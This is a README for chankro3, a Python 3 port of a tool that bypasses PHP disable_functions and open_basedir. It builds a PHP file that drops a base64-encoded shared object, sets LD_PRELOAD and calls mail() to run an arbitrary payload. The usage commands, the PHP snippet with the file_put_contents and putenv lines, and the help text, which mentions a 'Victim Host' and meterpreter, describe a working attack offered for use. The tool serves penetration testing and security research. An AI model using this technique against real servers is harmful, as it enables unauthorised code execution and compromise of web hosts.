# chankro3
In a nutshell: System Administrator disabled various functions in `php.ini`, but this script sets  `LD_PRELOAD` in the environment to our payload and executes it when executing a normal php command: mail.

To learn more about this checkout the original bug report from 2008: [
Bug #46741	putenv()+mail() allows for open_basedir bypass and "disabled" functionality by gat3way](https://bugs.php.net/bug.php?id=46741)



The original chankro was written in python2 and seems unsupported: [Chankro](https://github.com/TarlogicSecurity/Chankro)

## Installation

To run chankro3 there are no 3rd party packages required. Simply run it with `python3`.

Simply clone the repo:
```
git clone https://github.com/richardschwabe/chankro3.git
cd chankro3
python chankro3.py --help
```

## Usage

Run this to run the example:

```shell
python chankro3.py -p example_payload.sh -o example.php -r /var/www/html -n myname.so
```

This example uses the [example payload](example_payload.sh). Simply running a `whoami` command and saves its output to `/var/www/html/whoami.txt`.
Once you run the example command you should see a [example.php](example.php) file in your current directory. If you check the contents of the file you will see the custon name `myname` in two lines:

```php
...SNIP...
file_put_contents('/var/www/html/myname.so', base64_decode($hook));
...SNIP...
putenv('LD_PRELOAD=/var/www/html/myname.so');
...SNIP...
```

The remote path is set where you can find your `myname.so` file.



Here is the help command:

```shell
❯ python chankro3.py --help
usage: chankro3.py [-h] [-a {32,64}] [-p PAYLOAD] [-o OUTPUT] [-r REMOTE_PATH] [-n CUSTOM_NAME]

Generates PHP script to exploit disable_function and open_basedir

This version is a bit more customisable and for Python 3! You can find more info at:
Author: Richard Schwabe
Github: https://github.com/richardschwabe/chankro3

Original was for python2 you can find it here:
Author:   TarlogicSecurity
Original: https://github.com/TarlogicSecurity/Chankro

options:
  -h, --help            show this help message and exit
  -a {32,64}, --arch {32,64}
                        x86 or x64 Architecture, Default: 32
  -p PAYLOAD, --payload PAYLOAD
                        Binary to be executed (p.e. meterpreter)
  -o OUTPUT, --output OUTPUT
                        Output PHP filename, Default:chankro3.php
  -r REMOTE_PATH, --remote REMOTE_PATH
                        Absolute Path on Victim Host, Default: /tmp
  -n CUSTOM_NAME, --name CUSTOM_NAME
                        Custom name for remote chankro3 file, Default: chankro3.so
```


## License
For the contents of this repo, apart from otherwise specified:
[MIT](LICENSE)

For hook.c, hook32.so, hook64.so: GNU v3 as specified by the original Author.